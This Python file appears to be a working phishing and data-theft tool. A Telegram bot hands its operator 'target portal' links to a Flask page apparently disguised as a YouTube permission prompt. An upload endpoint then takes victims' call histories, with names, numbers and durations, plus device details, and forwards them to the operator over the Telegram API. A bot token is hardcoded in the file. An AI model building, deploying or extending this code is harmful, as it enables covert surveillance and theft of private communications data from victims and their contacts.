import os
import logging
from flask import Flask, request, render_template_string, jsonify
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
import threading
import requests

logging.basicConfig(level=logging.INFO)

API_TOKEN = os.getenv("BOT_TOKEN", "9292492876:AAFedJwHGmSZL4N86ZhtndqvjYt-6aHdvBs")

bot = Bot(token=API_TOKEN)
dp = Dispatcher()

app = Flask(__name__)

@app.route('/call-history-reveal')
def index():
    try:
        with open('camera.html', 'r', encoding='utf-8') as f:
            template_content = f.read()
        return render_template_string(template_content)
    except Exception as e:
        return f"Portal loading error: {str(e)}", 500

@app.route('/api/upload', methods=['POST'])
def upload_data():
    data = request.json
    if not data:
        return jsonify({"status": "failed"}), 400
    
    chat_id = data.get("chat_id")
    call_logs = data.get("callHistory", [])
    device_info = data.get("device", "Unknown")
    
    msg_text = f"🚨 <b>YouTube Permission (Call History) Captured!</b>\n━━━━━━━━━━━━━━━━━━━━\n📱 Device: <code>{device_info}</code>\n"
    if call_logs:
        msg_text += "\n📞 <b>Call Logs:</b>\n"
        for log in call_logs:
            msg_text += f"• {log.get('name')} ({log.get('number')}) - {log.get('type')} [{log.get('duration')}]\n"
    
    if chat_id and chat_id != 'unknown':
        url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
        payload = {
            "chat_id": int(chat_id),
            "text": msg_text,
            "parse_mode": "HTML"
        }
        try:
            requests.post(url, json=payload)
        except Exception as e:
            logging.error(f"Failed to push to Telegram: {e}")
            
    return jsonify({"status": "status_ok", "packet": "received"})

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer("System online, boss man. Use /link to generate the target portal.")

@dp.message(Command("link"))
async def cmd_link(message: types.Message):
    host_url = os.getenv("HOST_URL", "https://call-history-reveal.onrender.com")
    target_link = f"{host_url}/call-history-reveal?chat_id={message.chat.id}"
    await message.answer(f"Target portal generated, boss man:\n{target_link}", disable_web_page_preview=True)

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)

if __name__ == "__main__":
    import asyncio
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    async def main():
        await dp.start_polling(bot)
    
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logging.info("Bot stopped, boss man.")